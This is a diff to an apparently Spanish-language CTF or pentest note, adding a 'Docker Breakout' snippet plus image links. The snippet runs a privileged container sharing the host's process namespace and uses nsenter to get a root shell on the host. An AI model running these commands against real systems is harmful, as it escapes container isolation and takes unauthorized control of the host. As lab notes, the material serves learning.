@@ -420,4 +420,15 @@ reset xterm
 
 ### # Docker Breakout
 utilizando esta técnica podemos hacer un `Docker Breakout` y de esta manera escapar del contenedor y finalmente estamos en la maquina host
+
+```python
+# Get full access to the host via ns pid and nsenter cli
+
+docker run -it --rm --pid=host --privileged ubuntu bash
+
+nsenter --target 1 --mount --uts --ipc --net --pid -- bash
+```
+
 ![[Pasted image 20240823165444.png]]
+
+![[Pasted image 20240823165701.png]]
